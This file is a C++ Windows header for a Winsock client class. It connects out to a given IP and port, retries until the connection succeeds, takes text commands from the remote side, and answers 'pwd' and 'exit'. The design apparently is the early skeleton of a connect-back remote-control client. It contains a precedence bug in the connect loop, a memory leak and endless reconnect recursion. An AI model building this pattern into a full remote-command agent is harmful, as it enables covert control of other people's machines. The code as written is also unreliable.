#pragma once
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)
#include <winsock2.h>
#include "utils.h"

class Client {
	SOCKADDR_IN addr{ 0 };
	const char* IP;
	const short PORT;
	SOCKET sock{ 0 };
	short size_addr = sizeof(addr);
	int connection_result;
public:
	Client(const char* ip, const short port) : IP(ip), PORT(port) {
		addr.sin_addr.s_addr = inet_addr(IP);
		addr.sin_port = htons(PORT);
		addr.sin_family = AF_INET;
		connect_client();
	}

	void message_handler()
	{
		const int size_buffer = 216;
		char* buffer = new char[size_buffer + 1]();
		buffer[size_buffer] = '\0';

		while (connection_result == 0) {
			int recv_result = recv(sock, buffer, size_buffer, 0); 

			if (recv_result < 0) {
				MessageBoxA(0, "Data acceptance error!", LPCSTR(MB_ICONSTOP), 0);
				exit(1);
			}
			command_handler(buffer, size_buffer);
			memset(buffer, 0, size_buffer);
		}
	}

	void command_handler(char* command, int size_buffer)
	{
		Win_Api::Procces func;
		char* dir = new char[size_buffer + 1]();
		dir[size_buffer] = '\0';

		if (strcmp(command, "pwd") == 0) {
			dir = func.Pwd();
			send(sock, dir, strlen(dir), 0);
		}
		else if (strcmp(command, "exit") == 0) {
			send(sock, "Client disconnected", 20, 0);  //test functions
			exit(1);
		}
		else {
			send(sock, "Command not found!", 19, 0);
		}
		memset(dir, 0, size_buffer); memset(command, 0, size_buffer);
	}

	void connection_checker()
	{
		connect_client();
	}

	void connect_client()
	{
		WSAData wsaData;
		WORD DLLVersion = MAKEWORD(2, 1);

		if (WSAStartup(DLLVersion, &wsaData) != 0) {
			exit(1);
		}

		sock = socket(AF_INET, SOCK_STREAM, NULL);

		if (sock == INVALID_SOCKET) {
			system("pause");
			exit(1);
		}

		while (connection_result = connect(sock, (SOCKADDR*)&addr, size_addr) != 0) {}

		message_handler();
		connection_checker();
	}
};